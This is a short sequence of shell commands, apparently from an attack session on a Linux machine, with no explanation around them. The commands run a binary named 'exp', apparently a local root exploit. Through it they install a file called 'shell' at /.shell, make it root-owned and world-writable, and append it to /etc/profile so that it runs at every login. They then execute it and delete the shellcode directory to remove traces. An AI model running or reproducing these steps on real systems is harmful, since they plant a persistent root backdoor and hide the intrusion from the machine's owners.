chmod +x ./exp
./exp
./exp "mv ./shell /.shell"
./exp "chown root /.shell"
./exp "chmod 777 /.shell"
./exp "echo /.shell >> /etc/profile"
./exp "/.shell"
./exp "rm -rf ../shellcode"
